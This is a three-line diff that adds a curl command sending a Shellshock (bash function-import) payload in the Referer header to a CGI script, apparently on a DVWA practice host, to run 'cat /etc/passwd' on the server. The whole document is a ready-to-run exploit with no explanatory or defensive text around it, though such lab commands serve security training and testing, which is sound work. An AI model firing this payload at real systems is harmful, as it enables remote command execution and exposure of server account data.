@@ -1,0 +1,3 @@
+curl -i --max-time 15 \
+  -H 'Referer: () { :; }; /bin/bash -c "cat /etc/passwd"' \
+  http://dvwa.ccc.com/cgi-bin/status
